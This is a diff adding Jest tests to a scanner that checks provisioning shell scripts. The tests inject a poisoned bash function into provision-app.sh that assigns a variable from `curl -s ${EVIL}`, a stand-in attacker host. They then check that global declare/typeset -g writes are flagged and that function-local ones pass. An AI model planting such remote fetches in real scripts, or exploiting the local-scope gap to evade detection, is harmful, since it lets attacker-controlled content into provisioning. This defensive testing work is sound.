@@ -336,6 +336,35 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
     expect(scanFile(file, mutated)).toEqual([]);
   });
 
+  // ---- #1716 round 3 (review): `typeset` is a full synonym of `declare`,
+  // including `-g` — both leak the write to the caller exactly like a bare
+  // assignment, so both must red; without `-g` both are function-local.
+  it.each(['declare -g', 'typeset -g', 'declare -gx', 'typeset -xg'])(
+    '#1716 round 3: `%s tl=...` in an unreachable function is a GLOBAL write and reds provision-app.sh',
+    (kw) => {
+      const file = `${D}provision-app.sh`;
+      const text = readTracked(file);
+      const anchor = 'cmd_destroy() {';
+      const poisoned = `poison_tl() { ${kw} tl="$(curl -s ${EVIL})"; }\ncmd_poison() { poison_tl; }\n\n${anchor}`;
+      const mutated = text.replace(anchor, () => poisoned);
+      expect(mutated).not.toBe(text);
+      expect(scanFile(file, mutated).length).toBeGreaterThan(0);
+    },
+  );
+
+  it.each(['declare', 'typeset', 'declare -x', 'typeset -x'])(
+    '#1716 round 3: `%s tl=...` (no -g) is function-local and stays clean',
+    (kw) => {
+      const file = `${D}provision-app.sh`;
+      const text = readTracked(file);
+      const anchor = 'cmd_destroy() {';
+      const localized = `poison_tl() { ${kw} tl="$(curl -s ${EVIL})"; }\ncmd_poison() { poison_tl; }\n\n${anchor}`;
+      const mutated = text.replace(anchor, () => localized);
+      expect(mutated).not.toBe(text);
+      expect(scanFile(file, mutated)).toEqual([]);
+    },
+  );
+
   // ---- bypass class 1: fetch spellings and one-line chains ---------------
 
   it('class 1: catches every fetch spelling, a one-line chain, and a curl-wrapping helper', () => {
